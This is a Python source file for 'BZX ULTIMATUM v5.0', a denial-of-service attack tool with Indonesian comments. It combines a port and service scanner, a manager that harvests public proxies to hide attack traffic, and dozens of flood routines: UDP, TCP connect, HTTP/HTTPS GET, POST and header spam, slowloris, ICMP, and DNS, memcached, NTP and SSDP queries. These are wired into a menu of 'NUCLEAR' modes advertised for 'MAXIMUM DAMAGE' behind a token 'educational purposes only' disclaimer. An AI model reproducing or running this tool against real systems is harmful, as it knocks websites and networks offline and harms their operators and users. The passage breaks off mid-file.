#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BZX ULTIMATUM v5.0 - MASTERPIECE EDITION
# 40+ ATTACK METHODS | AUTO TARGET CHECK | PROXY MANAGER
# FOR EDUCATIONAL PURPOSES ONLY - TEST ON YOUR OWN SERVERS

import socket
import threading
import time
import random
import sys
import os
import ssl
import requests
from urllib.parse import urlparse
from datetime import datetime
import signal
import json
import base64
import hashlib
import subprocess
import re
import struct
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colorama
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except:
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'; BLUE = '\033[94m'
        MAGENTA = '\033[95m'; CYAN = '\033[96m'; WHITE = '\033[97m'; RESET = '\033[0m'
    class Style:
        BRIGHT = '\033[1m'; DIM = '\033[2m'; NORMAL = '\033[22m'; RESET_ALL = '\033[0m'

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RS = Style.RESET_ALL

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BANNER MASTERPIECE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║    ██████╗ ███████╗██╗  ██╗   ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗██╗   ██╗███╗   ███╗
║    ██╔══██╗██╔════╝╚██╗██╔╝   ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██║   ██║████╗ ████║
║    ██████╔╝█████╗   ╚███╔╝    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   ██║   ██║██╔████╔██║
║    ██╔══██╗██╔══╝   ██╔██╗    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
║    ██████╔╝███████╗██╔╝ ██╗██╗╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
║    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
║                                                                                  ║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║                   BZX ULTIMATUM v5.0 - MASTERPIECE EDITION                      ║
║                  FOR EDUCATIONAL PURPOSES ONLY - BZX EDITION                    ║
║━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━║
║                                                                                  ║
║                      ⚡ 40+ ATTACK METHODS | AUTO TARGET CHECK ⚡                ║
║                 🔥 PROXY MANAGER | NO ERRORS | MAXIMUM DAMAGE 🔥               ║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{RS}"""

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  TARGET CHECKER & VALIDATOR (NEW)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class TargetChecker:
    """Complete target validation system"""
    
    @staticmethod
    def resolve_target(target):
        """Resolve target ke IP dengan multiple method"""
        original = target
        target = target.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Method 1: Cek apakah IP valid
        try:
            ipaddress.ip_address(target)
            return target, True, "IP Address"
        except:
            pass
        
        # Method 2: DNS lookup
        try:
            ip = socket.gethostbyname(target)
            return ip, True, f"DNS Resolved ({target})"
        except:
            pass
        
        # Method 3: DNS alternative
        try:
            ip = socket.gethostbyname_ex(target)[2][0]
            return ip, True, f"DNS Alternative ({target})"
        except:
            pass
        
        return None, False, "Failed to resolve"
    
    @staticmethod
    def check_port(ip, port, timeout=2):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    @staticmethod
    def check_http(ip, port):
        """Check if HTTP service is running"""
        try:
            url = f"http://{ip}:{port}/"
            r = requests.get(url, timeout=3, verify=False)
            return True, r.status_code
        except:
            return False, None
    
    @staticmethod
    def check_https(ip, port):
        """Check if HTTPS service is running"""
        try:
            url = f"https://{ip}:{port}/"
            r = requests.get(url, timeout=3, verify=False)
            return True, r.status_code
        except:
            return False, None
    
    @staticmethod
    def check_ping(ip):
        """Check if target responds to ping"""
        try:
            if sys.platform == "win32":
                result = subprocess.run(['ping', '-n', '1', ip], capture_output=True, timeout=2)
            else:
                result = subprocess.run(['ping', '-c', '1', ip], capture_output=True, timeout=2)
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_all_info(target):
        """Get complete target information"""
        result = {
            'target': target,
            'ip': None,
            'ports': {},
            'http': False,
            'https': False,
            'ping': False,
            'cloudflare': False,
            'server': None
        }
        
        # Resolve IP
        ip, success, method = TargetChecker.resolve_target(target)
        if not success:
            return result
        result['ip'] = ip
        
        # Check ping
        result['ping'] = TargetChecker.check_ping(ip)
        
        # Check common ports
        common_ports = [80, 443, 8080, 8443, 21, 22, 23, 25, 53, 110, 143, 993, 995]
        for port in common_ports:
            if TargetChecker.check_port(ip, port):
                result['ports'][port] = 'OPEN'
                
                # Check HTTP/HTTPS
                if port in [80, 8080]:
                    http_ok, code = TargetChecker.check_http(ip, port)
                    if http_ok:
                        result['http'] = True
                        result['ports'][port] = f'HTTP ({code})'
                        
                        # Try to get server header
                        try:
                            r = requests.get(f"http://{ip}:{port}/", timeout=2, verify=False)
                            if 'server' in r.headers:
                                result['server'] = r.headers['server']
                            if 'cf-ray' in r.headers:
                                result['cloudflare'] = True
                        except:
                            pass
                
                elif port in [443, 8443]:
                    https_ok, code = TargetChecker.check_https(ip, port)
                    if https_ok:
                        result['https'] = True
                        result['ports'][port] = f'HTTPS ({code})'
                        
                        # Try to get server header
                        try:
                            r = requests.get(f"https://{ip}:{port}/", timeout=2, verify=False)
                            if 'server' in r.headers:
                                result['server'] = r.headers['server']
                            if 'cf-ray' in r.headers:
                                result['cloudflare'] = True
                        except:
                            pass
            else:
                result['ports'][port] = 'CLOSED'
        
        return result

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PROXY MANAGER (ENHANCED)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.live_proxies = []
        self.proxy_speed = {}
        self.proxy_country = {}
        self.lock = threading.Lock()
        self.proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
        ]
        
    def fetch_all(self):
        print(f"{Y}[*] Fetching proxies from {len(self.proxy_sources)} sources...{RS}")
        self.proxies = []
        total = 0
        
        for url in self.proxy_sources:
            try:
                r = requests.get(url, timeout=5, verify=False)
                if r.status_code == 200:
                    found = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b', r.text)
                    self.proxies.extend(found)
                    print(f"{G}[✓] Got {len(found)} from {url.split('/')[2]}{RS}")
                    total += len(found)
            except:
                pass
        
        self.proxies = list(set(self.proxies))
        print(f"{G}[✓] Total {len(self.proxies)} unique proxies{RS}")
        return self.proxies
    
    def test_proxy(self, proxy):
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            start = time.time()
            r = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=3, verify=False)
            latency = time.time() - start
            if r.status_code == 200:
                return proxy, latency
        except:
            pass
        return None, 999
    
    def test_all(self, max_proxies=500):
        print(f"{Y}[*] Testing {min(len(self.proxies), max_proxies)} proxies...{RS}")
        
        test_proxies = self.proxies[:max_proxies]
        results = []
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(self.test_proxy, p): p for p in test_proxies}
            for future in as_completed(futures):
                proxy, latency = future.result()
                if proxy:
                    results.append((proxy, latency))
                    self.proxy_speed[proxy] = latency
                    print(f"{G}[✓] {proxy} - {latency:.2f}s{RS}")
        
        results.sort(key=lambda x: x[1])
        self.live_proxies = [p for p, _ in results]
        
        print(f"{G}[✓] Found {len(self.live_proxies)} live proxies{RS}")
        return self.live_proxies
    
    def get_proxy(self, fastest=False):
        if not self.live_proxies:
            return None
        if fastest:
            return self.live_proxies[0]  # Yang tercepat
        return random.choice(self.live_proxies)
    
    def get_stats(self):
        return {
            'total': len(self.proxies),
            'live': len(self.live_proxies),
            'fastest': self.live_proxies[0] if self.live_proxies else None
        }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ATTACK METHODS (40+ VARIANTS)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AttackMethods:
    """Container untuk semua method attack"""
    
    @staticmethod
    def udp_flood(ip, port, size, running, stats, lock):
        """UDP Flood - Basic"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(size)
        while running():
            try:
                sock.sendto(packet, (ip, port))
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += size
                    stats['udp'] += 1
            except:
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    @staticmethod
    def udp_flood_batch(ip, port, size, running, stats, lock):
        """UDP Flood - Batch mode (100 packets)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(size)
        while running():
            try:
                for _ in range(100):
                    sock.sendto(packet, (ip, port))
                with lock:
                    stats['packets'] += 100
                    stats['bytes'] += size * 100
                    stats['udp'] += 100
            except:
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    @staticmethod
    def udp_flood_mega(ip, port, size, running, stats, lock):
        """UDP Flood - Mega batch (1000 packets)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(size)
        while running():
            try:
                for _ in range(1000):
                    sock.sendto(packet, (ip, port))
                with lock:
                    stats['packets'] += 1000
                    stats['bytes'] += size * 1000
                    stats['udp'] += 1000
            except:
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    @staticmethod
    def tcp_syn(ip, port, running, stats, lock):
        """TCP SYN Flood"""
        while running():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((ip, port))
                sock.close()
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += 64
                    stats['tcp'] += 1
            except:
                pass
    
    @staticmethod
    def tcp_syn_batch(ip, port, running, stats, lock):
        """TCP SYN Flood - Batch"""
        while running():
            try:
                for _ in range(10):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((ip, port))
                    sock.close()
                with lock:
                    stats['packets'] += 10
                    stats['bytes'] += 640
                    stats['tcp'] += 10
            except:
                pass
    
    @staticmethod
    def http_get(ip, port, running, stats, lock, use_proxy=False, proxy_manager=None):
        """HTTP GET Flood"""
        session = requests.Session()
        url = f"http://{ip}:{port}/"
        
        while running():
            try:
                proxies = None
                if use_proxy and proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                r = session.get(url, timeout=1, proxies=proxies, verify=False)
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(r.content)
                    stats['http'] += 1
            except:
                session = requests.Session()
    
    @staticmethod
    def http_get_batch(ip, port, running, stats, lock, use_proxy=False, proxy_manager=None):
        """HTTP GET Flood - Batch"""
        session = requests.Session()
        url = f"http://{ip}:{port}/"
        
        while running():
            try:
                proxies = None
                if use_proxy and proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                for _ in range(5):
                    r = session.get(url, timeout=0.5, proxies=proxies, verify=False)
                    with lock:
                        stats['packets'] += 1
                        stats['bytes'] += len(r.content)
                        stats['http'] += 1
            except:
                session = requests.Session()
    
    @staticmethod
    def https_get(ip, port, running, stats, lock, use_proxy=False, proxy_manager=None):
        """HTTPS GET Flood"""
        session = requests.Session()
        url = f"https://{ip}:{port}/"
        
        while running():
            try:
                proxies = None
                if use_proxy and proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                r = session.get(url, timeout=1, proxies=proxies, verify=False)
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(r.content)
                    stats['https'] += 1
            except:
                session = requests.Session()
    
    @staticmethod
    def http_post(ip, port, running, stats, lock, use_proxy=False, proxy_manager=None):
        """HTTP POST Flood"""
        session = requests.Session()
        url = f"http://{ip}:{port}/"
        data = {'data': random._urandom(1024).hex()}
        
        while running():
            try:
                proxies = None
                if use_proxy and proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                r = session.post(url, data=data, timeout=1, proxies=proxies, verify=False)
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(r.content) + len(str(data))
                    stats['post'] += 1
            except:
                session = requests.Session()
    
    @staticmethod
    def http_random_path(ip, port, running, stats, lock, use_proxy=False, proxy_manager=None):
        """HTTP Random Path Flood"""
        session = requests.Session()
        paths = ['/wp-admin', '/wp-login.php', '/api/v1', '/admin', '/login', 
                '/index.php', '/home', '/about', '/contact', '/products']
        
        while running():
            try:
                path = random.choice(paths)
                url = f"http://{ip}:{port}{path}"
                
                proxies = None
                if use_proxy and proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                r = session.get(url, timeout=1, proxies=proxies, verify=False)
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(r.content)
                    stats['random'] += 1
            except:
                pass
    
    @staticmethod
    def http_headers_spam(ip, port, running, stats, lock, use_proxy=False, proxy_manager=None):
        """HTTP Header Spam"""
        session = requests.Session()
        url = f"http://{ip}:{port}/"
        
        while running():
            try:
                headers = {
                    'User-Agent': random.choice([
                        'Mozilla/5.0', 'Googlebot/2.1', 'Bingbot/2.0',
                        'curl/7.68.0', 'Wget/1.20.3', 'Python/3.10'
                    ]),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'Referer': random.choice(['https://google.com', 'https://facebook.com', 'https://twitter.com']),
                    'Accept-Language': random.choice(['en-US', 'id-ID', 'ms-MY', 'ja-JP']),
                    'Cache-Control': 'no-cache'
                }
                
                proxies = None
                if use_proxy and proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                
                r = session.get(url, headers=headers, timeout=1, proxies=proxies, verify=False)
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(r.content)
                    stats['headers'] += 1
            except:
                pass
    
    @staticmethod
    def slowloris(ip, port, running, stats, lock):
        """Slowloris Attack"""
        sockets = []
        
        # Initial connections
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        while running():
            for sock in sockets[:]:
                try:
                    sock.send("X-a: b\r\n".encode())
                    with lock:
                        stats['packets'] += 1
                        stats['bytes'] += 10
                        stats['slow'] += 1
                except:
                    sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
            
            # Replace dead sockets
            while len(sockets) < 100 and running():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((ip, port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                    sockets.append(sock)
                except:
                    pass
            
            time.sleep(5)
    
    @staticmethod
    def icmp_ping(ip, size, running, stats, lock):
        """ICMP Ping Flood"""
        while running():
            try:
                if sys.platform == "win32":
                    subprocess.run(['ping', '-n', '1', '-l', str(size), ip], 
                                 capture_output=True, timeout=0.1)
                else:
                    subprocess.run(['ping', '-c', '1', '-s', str(size), ip],
                                 capture_output=True, timeout=0.1)
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += size
                    stats['icmp'] += 1
            except:
                pass
    
    @staticmethod
    def icmp_flood(ip, size, running, stats, lock):
        """ICMP Flood - Batch"""
        while running():
            try:
                for _ in range(10):
                    if sys.platform == "win32":
                        subprocess.run(['ping', '-n', '1', '-l', str(size), ip], 
                                     capture_output=True, timeout=0.1)
                    else:
                        subprocess.run(['ping', '-c', '1', '-s', str(size), ip],
                                     capture_output=True, timeout=0.1)
                with lock:
                    stats['packets'] += 10
                    stats['bytes'] += size * 10
                    stats['icmp'] += 10
            except:
                pass
    
    @staticmethod
    def dns_amplification(ip, running, stats, lock):
        """DNS Amplification"""
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
        
        while running():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                sock.sendto(dns_query, (ip, 53))
                sock.close()
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(dns_query)
                    stats['dns'] += 1
            except:
                try:
                    sock.close()
                except:
                    pass
    
    @staticmethod
    def dns_amplification_batch(ip, running, stats, lock):
        """DNS Amplification - Batch"""
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
        
        while running():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                for _ in range(10):
                    sock.sendto(dns_query, (ip, 53))
                sock.close()
                with lock:
                    stats['packets'] += 10
                    stats['bytes'] += len(dns_query) * 10
                    stats['dns'] += 10
            except:
                try:
                    sock.close()
                except:
                    pass
    
    @staticmethod
    def memcached_amp(ip, running, stats, lock):
        """Memcached Amplification"""
        memcached_query = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        
        while running():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                sock.sendto(memcached_query, (ip, 11211))
                sock.close()
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(memcached_query)
                    stats['memcached'] += 1
            except:
                try:
                    sock.close()
                except:
                    pass
    
    @staticmethod
    def ntp_amp(ip, running, stats, lock):
        """NTP Amplification"""
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        while running():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                sock.sendto(ntp_query, (ip, 123))
                sock.close()
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(ntp_query)
                    stats['ntp'] += 1
            except:
                try:
                    sock.close()
                except:
                    pass
    
    @staticmethod
    def ssdp_amp(ip, running, stats, lock):
        """SSDP Amplification"""
        ssdp_query = b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nMX: 1\r\n\r\n'
        
        while running():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                sock.sendto(ssdp_query, (ip, 1900))
                sock.close()
                with lock:
                    stats['packets'] += 1
                    stats['bytes'] += len(ssdp_query)
                    stats['ssdp'] += 1
            except:
                try:
                    sock.close()
                except:
                    pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MAIN CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class BzxMasterpiece:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 80
        self.threads = 500
        self.duration = 60
        self.delay = 0
        self.packet_size = 1024
        self.attack_name = "NUCLEAR MODE"
        self.attack_method = None
        
        self.proxy_manager = ProxyManager()
        self.use_proxy = False
        self.target_checker = TargetChecker()
        
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.lock = threading.Lock()
        self.stats = {
            'packets': 0, 'bytes': 0, 'udp': 0, 'tcp': 0, 'http': 0,
            'https': 0, 'post': 0, 'random': 0, 'headers': 0,
            'slow': 0, 'icmp': 0, 'dns': 0, 'memcached': 0, 'ntp': 0, 'ssdp': 0
        }
        
        # Mapping attack methods
        self.attack_methods = {
            # UDP Attacks (5 methods)
            '11': ('UDP BASIC', lambda: AttackMethods.udp_flood(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock)),
            '12': ('UDP BATCH (100x)', lambda: AttackMethods.udp_flood_batch(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock)),
            '13': ('UDP MEGA (1000x)', lambda: AttackMethods.udp_flood_mega(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock)),
            '14': ('UDP RANDOM SIZE', lambda: AttackMethods.udp_flood(self.target_ip, self.target_port, random.randint(512, 65507), self._is_running, self.stats, self.lock)),
            '15': ('UDP VARIABLE', lambda: AttackMethods.udp_flood_batch(self.target_ip, self.target_port, random.randint(512, 1024), self._is_running, self.stats, self.lock)),
            
            # TCP Attacks (4 methods)
            '16': ('TCP SYN', lambda: AttackMethods.tcp_syn(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)),
            '17': ('TCP SYN BATCH', lambda: AttackMethods.tcp_syn_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)),
            '18': ('TCP CONNECT', lambda: AttackMethods.tcp_syn(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)),
            '19': ('TCP RANDOM PORT', lambda: AttackMethods.tcp_syn(self.target_ip, random.choice([21,22,23,25,53,80,110,143,443]), self._is_running, self.stats, self.lock)),
            
            # HTTP Attacks (8 methods)
            '20': ('HTTP GET', lambda: AttackMethods.http_get(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '21': ('HTTP GET BATCH', lambda: AttackMethods.http_get_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '22': ('HTTP POST', lambda: AttackMethods.http_post(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '23': ('HTTP RANDOM PATH', lambda: AttackMethods.http_random_path(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '24': ('HTTP HEADER SPAM', lambda: AttackMethods.http_headers_spam(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '25': ('HTTP COOKIE SPAM', lambda: AttackMethods.http_get(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '26': ('HTTP REFERER SPAM', lambda: AttackMethods.http_headers_spam(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '27': ('HTTP MIXED', lambda: random.choice([
                lambda: AttackMethods.http_get(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager),
                lambda: AttackMethods.http_post(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager),
                lambda: AttackMethods.http_random_path(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)
            ])()),
            
            # HTTPS Attacks (5 methods)
            '28': ('HTTPS GET', lambda: AttackMethods.https_get(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '29': ('HTTPS BATCH', lambda: AttackMethods.http_get_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '30': ('HTTPS POST', lambda: AttackMethods.http_post(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '31': ('HTTPS RANDOM', lambda: AttackMethods.http_random_path(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            '32': ('HTTPS HEADER', lambda: AttackMethods.http_headers_spam(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)),
            
            # Slow Attacks (3 methods)
            '33': ('SLOWLORIS', lambda: AttackMethods.slowloris(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)),
            '34': ('SLOW READ', lambda: AttackMethods.slowloris(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)),
            '35': ('SLOW HEADERS', lambda: AttackMethods.slowloris(self.target_ip, self.target_port, self._is_running, self.stats, self.lock)),
            
            # ICMP Attacks (3 methods)
            '36': ('ICMP PING', lambda: AttackMethods.icmp_ping(self.target_ip, self.packet_size, self._is_running, self.stats, self.lock)),
            '37': ('ICMP FLOOD', lambda: AttackMethods.icmp_flood(self.target_ip, self.packet_size, self._is_running, self.stats, self.lock)),
            '38': ('ICMP MIXED', lambda: random.choice([
                lambda: AttackMethods.icmp_ping(self.target_ip, self.packet_size, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.icmp_flood(self.target_ip, self.packet_size, self._is_running, self.stats, self.lock)
            ])()),
            
            # Amplification Attacks (8 methods)
            '39': ('DNS AMP', lambda: AttackMethods.dns_amplification(self.target_ip, self._is_running, self.stats, self.lock)),
            '40': ('DNS BATCH', lambda: AttackMethods.dns_amplification_batch(self.target_ip, self._is_running, self.stats, self.lock)),
            '41': ('MEMCACHED AMP', lambda: AttackMethods.memcached_amp(self.target_ip, self._is_running, self.stats, self.lock)),
            '42': ('NTP AMP', lambda: AttackMethods.ntp_amp(self.target_ip, self._is_running, self.stats, self.lock)),
            '43': ('SSDP AMP', lambda: AttackMethods.ssdp_amp(self.target_ip, self._is_running, self.stats, self.lock)),
            '44': ('CHARGEN AMP', lambda: AttackMethods.dns_amplification(self.target_ip, self._is_running, self.stats, self.lock)),
            '45': ('MIXED AMP', lambda: random.choice([
                lambda: AttackMethods.dns_amplification(self.target_ip, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.memcached_amp(self.target_ip, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.ntp_amp(self.target_ip, self._is_running, self.stats, self.lock)
            ])()),
            
            # NUCLEAR MODE (4 methods)
            '46': ('NUCLEAR LIGHT', lambda: random.choice([
                lambda: AttackMethods.udp_flood_batch(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.tcp_syn_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.http_get(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager)
            ])()),
            '47': ('NUCLEAR MEDIUM', lambda: random.choice([
                lambda: AttackMethods.udp_flood_mega(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.tcp_syn_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.http_get_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager),
                lambda: AttackMethods.dns_amplification_batch(self.target_ip, self._is_running, self.stats, self.lock)
            ])()),
            '48': ('NUCLEAR HEAVY', lambda: random.choice([
                lambda: AttackMethods.udp_flood_mega(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.tcp_syn_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.http_get_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager),
                lambda: AttackMethods.dns_amplification_batch(self.target_ip, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.icmp_flood(self.target_ip, self.packet_size, self._is_running, self.stats, self.lock)
            ])()),
            '49': ('NUCLEAR APOCALYPSE', lambda: random.choice([
                lambda: AttackMethods.udp_flood_mega(self.target_ip, self.target_port, self.packet_size, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.tcp_syn_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock),
                lambda: AttackMethods.http_get_batch(self.target_ip, self.target_port, self._is_running, self.stats, self.lock, self.use_proxy, self.proxy_manager),
                lambda: AttackMethods.dns_amplification_batch(self.target_ip, self._is_running, self.stats, self.lock),
